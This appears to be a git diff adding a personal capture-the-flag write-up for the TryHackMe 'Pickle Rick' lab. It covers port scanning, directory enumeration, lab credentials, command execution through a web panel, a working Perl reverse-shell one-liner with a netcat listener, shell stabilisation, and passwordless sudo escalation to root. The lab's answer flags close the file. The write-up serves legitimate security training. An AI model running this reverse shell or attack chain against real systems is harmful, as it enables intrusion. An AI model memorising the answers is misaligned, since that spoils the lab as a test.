@@ -1,0 +1,82 @@
+10.10.106.135
+ttl 63 linux
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 eb:f3:d7:45:15:87:b5:40:bd:a7:6a:f9:19:c6:47:59 (RSA)
+|   256 03:9d:dc:03:6b:b8:76:6e:af:37:9d:3d:f2:2d:be:34 (ECDSA)
+|_  256 c5:e1:ce:ff:ea:5e:13:29:5e:8e:0d:00:4a:a0:ad:a3 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[+]WEB NOTES[+]
+Note to self, remember username!
+Username: R1ckRul3s
+
+[+]ENUMERATION[+]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.106.135/assets/]
+/index.html           (Status: 200) [Size: 1062]                                  
+/robots.txt           (Status: 200) [Size: 17]             
+/denied.php           (Status: 302) [Size: 0] [--> /login.php]
+login.php             (Status: 200) [Size : 201]
+
+curl hhtp://IP/robots.txt
+Wubbalubbadubdub
+
+[+]LOGIN.PHP[+]
+user : R1ckRul3s
+Paswd : Wubbalubbadubdub
+
+[+]http://10.10.106.135/portal.php#[+]
+command panel
+
+[+]ls
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+[+]strings Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+[+]pwd
+var/www/html
+
+[+]RCE[+]
+ping -c 2 10.18.92.168 
+tcpdump -i tun0 -v
+2 packets transmitted, 2 received.
+
+
+[+]REVERSHELL[+]
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+nc -lvnp 1234
+
+[+]TTY TREATMENT[+]
+script /dev/null -c bash
+ctrl z
+stty raw -echo;fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+
+[+]PRIVILAGE ESCALATION[+]
+sudo -l 
+(ALL : ALL)NO PASSWD ALL
+
+[+]ROOT[+]
+sudo su
+root@ip-10-10-106-135:~# whoami
+root
+
++++P0WN3D+++
+
+[+]TryHackMeAnswers[+]
+1 > mr. meeseek hair
+2 > 1 jerry tear
+3 > fleeb juice
